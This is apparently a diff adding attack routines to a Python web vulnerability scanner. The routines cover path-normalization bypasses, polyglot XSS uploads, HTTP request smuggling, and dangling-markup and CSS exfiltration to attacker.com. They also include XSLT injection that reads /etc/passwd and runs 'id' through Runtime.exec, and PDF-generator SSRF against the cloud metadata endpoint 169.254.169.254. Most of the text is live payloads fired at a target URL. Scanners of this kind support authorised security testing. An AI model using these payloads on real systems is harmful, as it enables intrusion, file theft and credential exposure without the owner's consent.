+            ('/TARGETPATH;.css', 'Semicolon + extension'),
+            ('/;/TARGETPATH', 'Semicolon prefix'),
+            
+            # Parameters
+            ('/TARGETPATH?', 'Empty query'),
+            ('/TARGETPATH#', 'Fragment'),
+            ('/TARGETPATH?.css', 'Query as extension'),
+            
+            # Case variations
+            ('/TARGETPATH', 'Original'),
+            ('/TaRgEtPaTh', 'Mixed case'),
+            
+            # Unicode
+            ('/TARGETPATH%c0%af', 'Overlong slash'),
+            ('/TARGETPATH%e0%80%af', 'Triple byte overlong'),
+            ('/TARGETPATH\uff0f', 'Fullwidth slash'),
+            
+            # Whitespace
+            ('/TARGETPATH%20', 'Trailing space'),
+            ('/TARGETPATH%09', 'Trailing tab'),
+            ('/%20TARGETPATH', 'Leading space'),
+        ]
+        
+        for sensitive_path in sensitive_paths:
+            for technique_template, technique_name in norm_techniques:
+                path = technique_template.replace('TARGETPATH', sensitive_path.lstrip('/'))
+                
+                try:
+                    resp = safe_request(
+                        f"{self.target}{path}",
+                        timeout=self.timeout,
+                        allow_redirects=False
+                    )
+                    
+                    if resp:
+                        # Check if we got different response than 404
+                        if resp.status_code in [200, 301, 302, 403]:
+                            # Compare with baseline for this path
+                            baseline_resp = safe_request(f"{self.target}{sensitive_path}", timeout=self.timeout)
+                            
+                            if baseline_resp and baseline_resp.status_code != resp.status_code:
+                                result = {
+                                    'technique': f'Path Norm: {technique_name}',
+                                    'bypass': True,
+                                    'status': resp.status_code,
+                                    'reason': f'{sensitive_path} accessible via {path[:30]}',
+                                    'severity': 'MEDIUM',
+                                    'category': 'PATH_NORMALIZATION'
+                                }
+                                results.append(result)
+                                print(f"  [✓] Path bypass: {technique_name} for {sensitive_path}")
+                                break
+                                
+                except Exception as e:
+                    logger.debug(f"Path normalization error: {e}")
+        
+        return results
+    
+    def _test_content_sniffing(self) -> List[Dict[str, Any]]:
+        """Content type sniffing attacks with polyglot files"""
+        results = []
+        print("  [*] Testing content sniffing attacks...")
+        
+        # Polyglot payloads (files that are valid in multiple formats)
+        polyglots = [
+            # GIFAR (GIF + ZIP/JAR)
+            (b'GIF89a/*<script>alert(1)</script>*/', 'image/gif', 'GIFAR'),
+            
+            # PDF + HTML
+            (b'%PDF-1.4<script>alert(1)</script>', 'application/pdf', 'PDF+HTML'),
+            
+            # PNG + HTML
+            (b'\x89PNG\r\n\x1a\n<script>alert(1)</script>', 'image/png', 'PNG+HTML'),
+            
+            # JPEG + HTML
+            (b'\xff\xd8\xff\xe0<script>alert(1)</script>', 'image/jpeg', 'JPEG+HTML'),
+            
+            # SVG (XML)
+            (b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 
+             'image/svg+xml', 'SVG+XSS'),
+        ]
+        
+        # Test upload endpoints
+        upload_endpoints = ['/upload', '/api/upload', '/files', '/media', '/images']
+        
+        for endpoint in upload_endpoints[:2]:
+            for content, mime_type, technique in polyglots[:3]:
+                try:
+                    # Upload the polyglot
+                    files = {'file': ('test.gif', content, mime_type)}
+                    resp = self._session.post(
+                        f"{self.target}{endpoint}",
+                        files=files,
+                        timeout=self.timeout,
+                        verify=False
+                    )
+                    
+                    if resp and resp.status_code in [200, 201]:
+                        # Check if file URL is returned
+                        if 'url' in resp.text.lower() or 'path' in resp.text.lower():
+                            result = {
+                                'technique': f'Content Sniff: {technique}',
+                                'bypass': True,
+                                'status': resp.status_code,
+                                'reason': f'Polyglot {technique} uploaded at {endpoint}',
+                                'severity': 'MEDIUM',
+                                'category': 'CONTENT_SNIFFING'
+                            }
+                            results.append(result)
+                            print(f"  [!] Content sniff: {technique} at {endpoint}")
+                            
+                except Exception as e:
+                    logger.debug(f"Content sniffing error: {e}")
+        
+        # Check for X-Content-Type-Options header
+        try:
+            resp = safe_request(self.target, timeout=self.timeout)
+            if resp:
+                xcto = resp.headers.get('X-Content-Type-Options', '')
+                if xcto.lower() != 'nosniff':
+                    result = {
+                        'technique': 'Missing X-Content-Type-Options',
+                        'bypass': False,
+                        'status': resp.status_code,
+                        'reason': 'Content sniffing protection not enabled',
+                        'severity': 'LOW',
+                        'category': 'CONTENT_SNIFFING'
+                    }
+                    results.append(result)
+        except:
+            pass
+        
+        return results
+    
+    def _test_buffer_limits(self) -> List[Dict[str, Any]]:
+        """Test buffer limits - large headers, body, URL"""
+        results = []
+        print("  [*] Testing buffer/size limits...")
+        
+        # Large URL test
+        url_lengths = [2000, 4000, 8000, 16000]
+        for length in url_lengths:
+            try:
+                long_param = 'A' * length
+                resp = safe_request(
+                    f"{self.target}/?test={long_param}",
+                    timeout=self.timeout + 5
+                )
+                
+                if resp:
+                    if resp.status_code in [200, 400, 414]:
+                        if resp.status_code == 200:
+                            result = {
+                                'technique': f'Large URL Accepted: {length} chars',
+                                'bypass': False,
+                                'status': resp.status_code,
+                                'reason': f'Server accepts URL with {length} char param',
+                                'severity': 'INFO',
+                                'category': 'BUFFER_LIMITS'
+                            }
+                            results.append(result)
+                else:
+                    break  # Server rejected, no point testing larger
+                    
+            except Exception as e:
+                break
+        
+        # Large header test
+        header_sizes = [4000, 8000, 16000]
+        for size in header_sizes:
+            try:
+                resp = safe_request(
+                    self.target,
+                    timeout=self.timeout,
+                    headers={'X-Large-Header': 'A' * size}
+                )
+                
+                if resp and resp.status_code == 200:
+                    result = {
+                        'technique': f'Large Header Accepted: {size} chars',
+                        'bypass': False,
+                        'status': resp.status_code,
+                        'reason': f'Server accepts {size} char header',
+                        'severity': 'INFO',
+                        'category': 'BUFFER_LIMITS'
+                    }
+                    results.append(result)
+                else:
+                    break
+                    
+            except Exception as e:
+                break
+        
+        # Many headers test
+        try:
+            many_headers = {f'X-Header-{i}': f'value-{i}' for i in range(100)}
+            resp = safe_request(
+                self.target,
+                timeout=self.timeout,
+                headers=many_headers
+            )
+            
+            if resp and resp.status_code == 200:
+                result = {
+                    'technique': 'Many Headers Accepted: 100 headers',
+                    'bypass': False,
+                    'status': resp.status_code,
+                    'reason': 'Server accepts 100 custom headers',
+                    'severity': 'INFO',
+                    'category': 'BUFFER_LIMITS'
+                }
+                results.append(result)
+                
+        except Exception as e:
+            logger.debug(f"Many headers test error: {e}")
+        
+        # Large POST body test
+        body_sizes = [1024*100, 1024*1000, 1024*10000]  # 100KB, 1MB, 10MB
+        for size in body_sizes:
+            try:
+                resp = self._session.post(
+                    self.target,
+                    data='A' * size,
+                    timeout=self.timeout + 10,
+                    verify=False,
+                    headers={'Content-Type': 'application/octet-stream'}
+                )
+                
+                if resp and resp.status_code in [200, 201]:
+                    size_kb = size // 1024
+                    result = {
+                        'technique': f'Large Body Accepted: {size_kb}KB',
+                        'bypass': False,
+                        'status': resp.status_code,
+                        'reason': f'Server accepts {size_kb}KB POST body',
+                        'severity': 'INFO' if size_kb < 1000 else 'LOW',
+                        'category': 'BUFFER_LIMITS'
+                    }
+                    results.append(result)
+                else:
+                    break
+                    
+            except Exception as e:
+                break
+        
+        return results
+
+    # ============================================================================
+    # ADDITIONAL DANGEROUS TESTS
+    # ============================================================================
+    
+    def _test_http_desync(self) -> List[Dict[str, Any]]:
+        """HTTP Desync attacks - advanced request smuggling"""
+        results = []
+        print("  [*] Testing HTTP Desync attacks...")
+        
+        desync_payloads = [
+            # CL.CL desync
+            {
+                'headers': {
+                    'Content-Length': '6',
+                    'Content-Length': '5',  # Will be overwritten, just for documentation
+                },
+                'body': 'GPOST',
+                'technique': 'CL.CL Desync'
+            },
+            
+            # Space before colon
+            {
+                'headers': {
+                    'Content-Length ': '0',
+                    'Transfer-Encoding': 'chunked',
+                },
+                'body': '0\r\n\r\n',
+                'technique': 'Space in header name'
+            },
+            
+            # Tab in header value
+            {
+                'headers': {
+                    'Transfer-Encoding': '\tchunked',
+                },
+                'body': '0\r\n\r\n',
+                'technique': 'Tab before chunked'
+            },
+            
+            # Vertical tab
+            {
+                'headers': {
+                    'Transfer-Encoding': '\x0bchunked',
+                },
+                'body': '0\r\n\r\n',
+                'technique': 'Vertical tab'
+            },
+            
+            # Form feed
+            {
+                'headers': {
+                    'Transfer-Encoding': '\x0cchunked',
+                },
+                'body': '0\r\n\r\n',
+                'technique': 'Form feed'
+            },
+            
+            # Line wrapping (obs-fold)
+            {
+                'headers': {
+                    'Transfer-Encoding': 'chunked',
+                    'X-Test': 'value\r\n continued',
+                },
+                'body': '0\r\n\r\n',
+                'technique': 'Line wrapping'
+            },
+        ]
+        
+        for payload in desync_payloads:
+            try:
+                resp = self._session.post(
+                    self.target,
+                    headers=payload['headers'],
+                    data=payload['body'],
+                    timeout=self.timeout,
+                    verify=False
+                )
+                
+                if resp and resp.status_code in [200, 400]:
+                    # Analyze response for desync indicators
+                    if resp.status_code == 200 and len(resp.content) != self._baseline_size:
+                        result = {
+                            'technique': f"HTTP Desync: {payload['technique']}",
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': 'Potential HTTP desync detected',
+                            'severity': 'HIGH',
+                            'category': 'HTTP_DESYNC'
+                        }
+                        results.append(result)
+                        print(f"  [!] HTTP Desync: {payload['technique']}")
+                        
+            except Exception as e:
+                logger.debug(f"HTTP desync error: {e}")
+        
+        return results
+    
+    def _test_dangling_markup(self) -> List[Dict[str, Any]]:
+        """Dangling markup injection for data exfiltration"""
+        results = []
+        print("  [*] Testing dangling markup injection...")
+        
+        dangling_payloads = [
+            # Image tag without closing
+            '<img src="http://attacker.com/log?',
+            # Form action hijacking
+            '<form action="http://attacker.com/steal"><input name="',
+            # Meta refresh
+            '<meta http-equiv="refresh" content="0;url=http://attacker.com/log?',
+            # Style import
+            '<style>@import "http://attacker.com/log?',
+            # Link preload
+            '<link rel="preload" href="http://attacker.com/log?',
+            # Base tag
+            '<base href="http://attacker.com/',
+            # Button form action
+            '<button formaction="http://attacker.com/steal">',
+            # Object data
+            '<object data="http://attacker.com/log?',
+            # Textarea
+            '<textarea name="stolen">',
+            # Comment
+            '<!--',
+        ]
+        
+        for payload in dangling_payloads:
+            try:
+                encoded = quote(payload)
+                resp = safe_request(
+                    f"{self.target}/?test={encoded}",
+                    timeout=self.timeout
+                )
+                
+                if resp and payload in resp.text:
+                    result = {
+                        'technique': f'Dangling Markup: {payload[:30]}...',
+                        'bypass': True,
+                        'status': resp.status_code,
+                        'reason': 'Unclosed HTML tag reflected - data exfiltration possible',
+                        'severity': 'MEDIUM',
+                        'category': 'DANGLING_MARKUP'
+                    }
+                    results.append(result)
+                    print(f"  [!] Dangling markup reflected")
+                    
+            except Exception as e:
+                logger.debug(f"Dangling markup error: {e}")
+        
+        return results
+    
+    def _test_css_injection(self) -> List[Dict[str, Any]]:
+        """CSS injection for data exfiltration"""
+        results = []
+        print("  [*] Testing CSS injection...")
+        
+        css_payloads = [
+            # Attribute selector exfiltration
+            'input[value^="a"]{background:url(http://attacker.com/a)}',
+            # Font-face exfiltration
+            '@font-face{font-family:x;src:url(http://attacker.com/log)}',
+            # Import exfiltration
+            '@import "http://attacker.com/log";',
+            # Style injection via expression (IE)
+            'body{xss:expression(alert(1))}',
+            # CSS variable injection
+            '--x:url(http://attacker.com/log);',
+        ]
+        
+        injection_points = [
+            ('style=', 'Inline style'),
+            ('<style>', 'Style tag'),
+            ('"></style><style>', 'Style breakout'),
+        ]
+        
+        for payload in css_payloads[:3]:
+            for injection, technique in injection_points:
+                try:
+                    full_payload = f"{injection}{payload}"
+                    encoded = quote(full_payload)
+                    
+                    resp = safe_request(
+                        f"{self.target}/?test={encoded}",
+                        timeout=self.timeout
+                    )
+                    
+                    if resp and payload in resp.text:
+                        result = {
+                            'technique': f'CSS Injection: {technique}',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': 'CSS injection reflected - data exfiltration possible',
+                            'severity': 'MEDIUM',
+                            'category': 'CSS_INJECTION'
+                        }
+                        results.append(result)
+                        print(f"  [!] CSS injection via {technique}")
+                        break
+                        
+                except Exception as e:
+                    logger.debug(f"CSS injection error: {e}")
+        
+        return results
+    
+    def _test_xslt_injection(self) -> List[Dict[str, Any]]:
+        """XSLT injection testing"""
+        results = []
+        print("  [*] Testing XSLT injection...")
+        
+        xslt_payloads = [
+            # Document function (SSRF/file read)
+            '<xsl:value-of select="document(\'http://attacker.com/\')"/>',
+            '<xsl:value-of select="document(\'file:///etc/passwd\')"/>',
+            
+            # System property disclosure
+            '<xsl:value-of select="system-property(\'xsl:vendor\')"/>',
+            
+            # PHP function (if PHP XSL extension)
+            '<xsl:value-of select="php:function(\'system\', \'id\')"/>',
+            
+            # Java extension
+            '<xsl:value-of xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" select="rt:exec(rt:getRuntime(),\'id\')"/>',
+            
+            # Include/import
+            '<xsl:include href="http://attacker.com/evil.xsl"/>',
+        ]
+        
+        # Test endpoints that might process XSLT
+        xslt_endpoints = [
+            self.target,
+            f"{self.target}/transform",
+            f"{self.target}/api/transform",
+            f"{self.target}/xslt",
+        ]
+        
+        for endpoint in xslt_endpoints[:2]:
+            for payload in xslt_payloads[:3]:
+                try:
+                    # Test via POST
+                    resp = self._session.post(
+                        endpoint,
+                        data=payload,
+                        headers={'Content-Type': 'application/xml'},
+                        timeout=self.timeout,
+                        verify=False
+                    )
+                    
+                    if resp:
+                        # Check for XSLT execution indicators
+                        indicators = ['Saxon', 'Xalan', 'libxslt', 'root:', 'uid=', 'attacker.com']
+                        if any(ind in resp.text for ind in indicators):
+                            result = {
+                                'technique': 'XSLT Injection',
+                                'bypass': True,
+                                'status': resp.status_code,
+                                'reason': 'XSLT payload executed',
+                                'severity': 'CRITICAL',
+                                'category': 'XSLT_INJECTION'
+                            }
+                            results.append(result)
+                            print(f"  [✓] CRITICAL: XSLT Injection")
+                            
+                except Exception as e:
+                    logger.debug(f"XSLT injection error: {e}")
+        
+        return results
+    
+    def _test_pdf_injection(self) -> List[Dict[str, Any]]:
+        """PDF generation injection testing"""
+        results = []
+        print("  [*] Testing PDF generation injection...")
+        
+        # Payloads for PDF generators (wkhtmltopdf, PhantomJS, etc.)
+        pdf_payloads = [
+            # SSRF via PDF
+            '<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>',
+            '<img src="http://169.254.169.254/latest/meta-data/">',
+            '<link rel="stylesheet" href="http://169.254.169.254/">',
+            
+            # Local file read
+            '<iframe src="file:///etc/passwd"></iframe>',
+            '<embed src="file:///etc/passwd">',
+            '<object data="file:///etc/passwd">',
+            
+            # JavaScript execution
+            '<script>x=new XMLHttpRequest();x.open("GET","http://attacker.com/",false);x.send();</script>',
+            
+            # Annotation injection
+            '<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File">',
+        ]
+        
+        # PDF generation endpoints
+        pdf_endpoints = [
+            '/pdf', '/api/pdf', '/generate-pdf', '/export/pdf',
+            '/download/pdf', '/report', '/invoice', '/print'
+        ]
+        
+        for endpoint in pdf_endpoints[:3]:
+            for payload in pdf_payloads[:3]:
+                try:
+                    resp = self._session.post(
+                        f"{self.target}{endpoint}",
+                        data={'content': payload, 'html': payload, 'body': payload},
+                        timeout=self.timeout + 5,
+                        verify=False
+                    )
+                    
+                    if resp and resp.status_code == 200:
+                        # Check if response is PDF
+                        if resp.content[:4] == b'%PDF' or 'application/pdf' in resp.headers.get('Content-Type', ''):
+                            result = {
+                                'technique': f'PDF Injection: {endpoint}',
+                                'bypass': True,
+                                'status': resp.status_code,
+                                'reason': 'PDF generation endpoint found - test for SSRF/LFI',
+                                'severity': 'MEDIUM',
+                                'category': 'PDF_INJECTION'
+                            }
+                            results.append(result)
+                            print(f"  [!] PDF generation at {endpoint}")
+                            break
+                            
+                except Exception as e:
+                    logger.debug(f"PDF injection error: {e}")
+        
+        return results
+    
+    def _test_postmessage_vulnerabilities(self) -> List[Dict[str, Any]]:
+        """PostMessage vulnerability detection"""
+        results = []
+        print("  [*] Testing PostMessage vulnerabilities...")
+        
+        try:
+            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if not resp:
+                return results
+            
+            content = resp.text.lower()
+            
+            # Check for postMessage usage
+            postmessage_patterns = [
+                'postmessage',
+                'addeventlistener.*message',
+                'onmessage',
+                'window.parent.postmessage',
+                'parent.postmessage',
+                'opener.postmessage',
+            ]
+            
+            # Check for insecure origin validation
+            insecure_patterns = [
+                'event.origin',  # Good if followed by comparison
+                "event.origin === '*'",  # Bad
+                'event.origin == null',  # Bad
+                "indexof('http')",  # Weak validation
+                ".includes('.",  # Weak validation
+            ]
+            
+            found_postmessage = any(p in content for p in postmessage_patterns)
+            
+            if found_postmessage:
+                # Check for insecure patterns
+                has_insecure = any(p in content for p in insecure_patterns[1:])
+                no_origin_check = 'event.origin' not in content
+                
+                if has_insecure or no_origin_check:
+                    result = {
+                        'technique': 'PostMessage Vulnerability',
+                        'bypass': True,
+                        'status': resp.status_code,
+                        'reason': 'postMessage used without proper origin validation',
+                        'severity': 'MEDIUM',
+                        'category': 'POSTMESSAGE'
+                    }
+                    results.append(result)
+                    print(f"  [!] PostMessage vulnerability detected")
+                else:
+                    result = {
+                        'technique': 'PostMessage Usage',
+                        'bypass': False,
+                        'status': resp.status_code,
+                        'reason': 'postMessage found - manual review recommended',
+                        'severity': 'INFO',
+                        'category': 'POSTMESSAGE'
+                    }
+                    results.append(result)
+                    
+        except Exception as e:
+            logger.debug(f"PostMessage test error: {e}")
+        
+        return results
+    
+    def _test_rpo_attack(self) -> List[Dict[str, Any]]:
+        """Relative Path Overwrite (RPO) attack testing"""
+        results = []
+        print("  [*] Testing Relative Path Overwrite (RPO)...")
+        
+        # RPO test paths
+        rpo_paths = [
+            '/test/..%2f..%2f',
+            '/test/..%5c..%5c',
+            '/test%2f..%2f..%2f',
+            '/test/;/../',
+            '/test/./;/../../',
+        ]
+        
+        try:
+            # Get baseline to check for relative paths
+            resp = safe_request(self.target, timeout=self.timeout)
+            if resp:
+                # Check for relative CSS/JS paths (vulnerable to RPO)
+                relative_patterns = [
+                    r'href=["\'](?!https?://|//)[^"\']+\.css',
+                    r'src=["\'](?!https?://|//)[^"\']+\.js',
+                ]
+                
+                has_relative = any(re.search(p, resp.text) for p in relative_patterns)
+                
+                if has_relative:
+                    for rpo_path in rpo_paths:
+                        try:
+                            rpo_resp = safe_request(
+                                f"{self.target}{rpo_path}",
+                                timeout=self.timeout,
+                                allow_redirects=False
+                            )
+                            
+                            if rpo_resp and rpo_resp.status_code == 200:
+                                # Check if path traversal affected CSS/JS loading
+                                result = {
+                                    'technique': f'RPO: {rpo_path[:30]}',
+                                    'bypass': True,
+                                    'status': rpo_resp.status_code,
+                                    'reason': 'Relative paths + path manipulation = potential XSS via CSS',
+                                    'severity': 'MEDIUM',
+                                    'category': 'RPO_ATTACK'
+                                }
+                                results.append(result)
+                                print(f"  [!] RPO vulnerability potential")
+                                break
+                                
+                        except:
+                            pass
+                else:
+                    result = {
+                        'technique': 'RPO Check',
+                        'bypass': False,
+                        'status': resp.status_code,
+                        'reason': 'No relative paths found - RPO unlikely',
+                        'severity': 'INFO',
+                        'category': 'RPO_ATTACK'
+                    }
+                    results.append(result)
+                    
+        except Exception as e:
+            logger.debug(f"RPO test error: {e}")
+        
+        return results
+    
+    def _test_integer_overflow(self) -> List[Dict[str, Any]]:
+        """Integer overflow/underflow testing"""
+        results = []
+        print("  [*] Testing integer overflow/underflow...")
+        
+        overflow_values = [
+            # 32-bit boundaries
+            ('2147483647', '32-bit max'),
+            ('2147483648', '32-bit max+1'),
+            ('-2147483648', '32-bit min'),
+            ('-2147483649', '32-bit min-1'),
+            
+            # 64-bit boundaries
+            ('9223372036854775807', '64-bit max'),
+            ('9223372036854775808', '64-bit max+1'),
+            
+            # Unsigned boundaries
+            ('4294967295', 'unsigned 32-bit max'),
+            ('4294967296', 'unsigned 32-bit max+1'),
+            
+            # Common overflow triggers
+            ('0', 'zero'),
+            ('-1', 'negative one'),
+            ('99999999999999999999', 'very large'),
+            ('-99999999999999999999', 'very negative'),
+        ]
+        
+        # Parameters commonly processed as integers
+        int_params = ['id', 'count', 'page', 'limit', 'offset', 'quantity', 'amount', 'size', 'index']
+        
+        for param in int_params[:5]:
+            for value, technique in overflow_values[:6]:
+                try:
+                    resp = safe_request(
+                        f"{self.target}/?{param}={value}",
+                        timeout=self.timeout
+                    )
+                    
+                    if resp:
+                        # Check for error indicators
+                        error_indicators = [
+                            'overflow', 'out of range', 'too large', 'too small',
+                            'invalid', 'error', 'exception', 'negative'
+                        ]
+                        
+                        if resp.status_code == 500 or any(ind in resp.text.lower() for ind in error_indicators):
+                            result = {
+                                'technique': f'Integer Overflow: {param}={technique}',
+                                'bypass': True,
+                                'status': resp.status_code,
+                                'reason': f'Server error with {technique} value',
+                                'severity': 'LOW',
+                                'category': 'INTEGER_OVERFLOW'
+                            }
+                            results.append(result)
+                            print(f"  [!] Integer issue: {param} with {technique}")
+                            break
+                            
+                except Exception as e:
+                    logger.debug(f"Integer overflow error: {e}")
         
         return results
 
